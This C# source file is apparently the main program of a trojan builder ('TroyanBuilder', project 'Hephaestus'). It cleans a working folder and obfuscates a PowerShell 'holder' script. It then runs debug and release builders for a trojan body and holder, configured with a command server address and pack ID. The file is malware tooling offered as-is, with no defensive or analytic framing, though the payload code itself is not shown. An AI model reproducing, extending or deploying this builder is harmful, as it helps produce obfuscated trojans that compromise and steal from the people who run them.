using model;

namespace TroyanBuilder;

public class Program
{
    public static bool ObfuscateDebug = false;
    
    public static bool ObfuscateRelease = false;
    
    public static bool RandomCode = false;
    
    public static bool RandomDo = false;
    
    static void Clean()
    {
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Hephaestus");

        if (Directory.Exists(path))
        {
            foreach (var file in Directory.GetFiles(path)) File.Delete(file);
            foreach (var dir in Directory.GetDirectories(path)) Directory.Delete(dir, true);
            Console.WriteLine("Contents deleted.");
        }

    }
    static void Main2()
    {
        Clean();
        var data = File.ReadAllText(@"C:\soft\hephaestus\troyan\troyanps\holder\holder.ps1");
        data = new PowerShellObfuscator().Obfuscate(data);
        File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\1.ps1", data);
    }

    static void Main(string[] args)
    {
        string server = args.Length > 0 ? args[0] : Dev.Mode;
        if (args.Length >= 1)
        {
            server = args[0];
        }
        string packId = "";
        if (args.Length >= 2)
        {
            packId = args[1];
        }
        
        Clean();
        var arr = new CustomBuilder[]{new BodyBuilderDebug(), new BodyBuilderRelease(), new HolderBuilderDebug(), new HolderBuilderRelease()};
        foreach (var cb in arr)
        {
            Console.WriteLine(cb);
            var result = cb.Build(server, packId);
            foreach (var line in result)
            {
                Console.WriteLine(line);    
            }
        }
    }
}